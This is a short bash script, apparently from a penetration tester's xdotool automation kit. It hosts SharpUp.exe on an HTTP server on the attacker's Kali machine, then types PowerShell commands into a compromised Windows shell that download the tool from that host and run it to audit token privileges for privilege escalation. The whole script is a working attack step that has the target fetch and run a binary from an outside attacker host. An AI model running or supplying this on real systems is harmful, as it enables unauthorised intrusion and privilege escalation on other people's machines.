#!/bin/bash

: '
SharpUp - audit token privileges - PS: download SharpUp to server and execute.
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

cd ~/Desktop/base/code/xdotool/scripts/windows/permissions/.files
python3 -m http.server 1337 &
HTTP_PID=$!

paste_command "Invoke-WebRequest 'http://${KALI_IP}:1337/SharpUp.exe' -OutFile 'SharpUp.exe'"
xdotool key Return
sleep 3

paste_command ".\SharpUp.exe audit TokenPrivileges"
xdotool key Return
sleep 10

kill $HTTP_PID